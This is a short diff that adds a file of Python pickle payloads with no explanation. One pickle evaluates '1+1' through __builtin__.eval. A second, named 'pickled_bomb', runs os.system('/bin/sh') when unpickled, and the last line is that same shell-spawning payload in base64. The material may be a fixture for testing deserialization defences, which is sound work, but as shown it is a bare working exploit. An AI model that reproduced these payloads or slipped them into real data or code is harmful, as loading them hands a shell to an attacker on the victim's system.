@@ -1,0 +1,6 @@
+c__builtin__
+eval
+(V1+1)
+tR.
+pickled_bomb = b'c__builtin__\neval\n(V__import__("os").system("/bin/sh")\ntR.'
+Y19fYnVpbHRpbl9fCmV2YWwKKFZfX2ltcG9ydF9fKCJvcyIpLnN5c3RlbSgiL2Jpbi9zaCIpCnRSLg==
